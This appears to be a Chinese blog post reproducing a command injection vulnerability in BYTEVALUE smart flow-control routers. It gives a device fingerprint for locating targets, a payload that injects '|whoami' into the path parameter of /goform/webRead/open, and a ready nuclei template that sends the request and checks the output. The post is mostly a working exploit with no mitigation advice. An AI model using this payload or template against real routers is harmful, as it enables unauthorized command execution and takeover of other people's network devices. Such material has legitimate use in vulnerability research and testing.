# 原创
：  【漏洞复现】BYTEVALUE智能流控路由器存在命令执行

# 【漏洞复现】BYTEVALUE智能流控路由器存在命令执行

### 【漏洞介绍】

百为智能流控路由器 /goform/webRead/open 路由的 ?path 参数存在有回显的命令注入漏洞。攻击者可通过该漏洞在服务器端执行命令，写入后门，获取服务器权限，从而获取路由器权限。

### 【指纹】

title=”BYTEVALUE 智能流控路由器”

### 【UI】

### 【payload】

/goform/webRead/open/?path=|whoami

### 【Poc】

```
id: BYTEVALUE-Rce
info:
  name: BYTEVALUE-Rce
  author: BYTEVALUE-Rce
  severity: critical
  tags: BYTEVALUE

http:
  - raw:
    - |
        GET /goform/webRead/open/?path=|whoami HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "admin"
      - type: status
        status:
          - 200

```

### 【使用nuclei复现】
